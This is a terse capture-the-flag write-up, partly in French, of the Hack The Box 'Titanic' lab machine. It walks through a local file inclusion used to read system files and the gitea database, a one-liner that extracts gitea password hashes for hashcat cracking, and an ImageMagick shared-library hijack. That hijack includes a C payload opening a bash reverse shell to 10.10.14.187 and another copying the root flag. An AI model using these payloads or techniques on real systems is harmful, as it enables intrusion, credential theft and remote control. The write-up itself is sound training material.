# Titanic

ffuf : dev.titanic.htb : gitea

connexion au gitea, LFI sur titanic.htb/download?ticket=<LFI>

OK
/etc/passwd
/home/developer/.ssh/id_rsa.pub

NOK
/home/developer/.ssh/id_rsa (chmod 600)

Dossier monté
/home/developer/gitea/data/<LFI>

NOK
/home/developer/gitea/data/developer/docker-config.git

/home/developer/gitea/data/gitea/log/gitea.log

gitea db with :

/home/developer/gitea/data/gitea/gitea.db

Then curl it. Don't forget to remove the -i to remove the HTML headers !

wget could have worked as well

Next we got the gitea hashes :
https://0xdf.gitlab.io/2024/12/14/htb-compiled.html#

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```

We can crack the hashes with hashcat :
hashcat gitea.hashes /opt/rockyou.txt --user

got dev pass : 25282528

## Root

ImageMagick 7.1.1-35 exploit

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >& /dev/tcp/10.10.14.187/4444 0>&1'");
    exit(0);
}
EOF
```

did not work...

```bash
#/bin/bash

rm -rf poc.sh

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/root2.txt");
    exit(0);
}
EOF

cp home.jpg root.jpg

if [ -f /tmp/root2.txt ]; then
    echo "Exploit succeeded"
    cat /tmp/root2.txt
else
    echo "Exploit failed"
fi
```

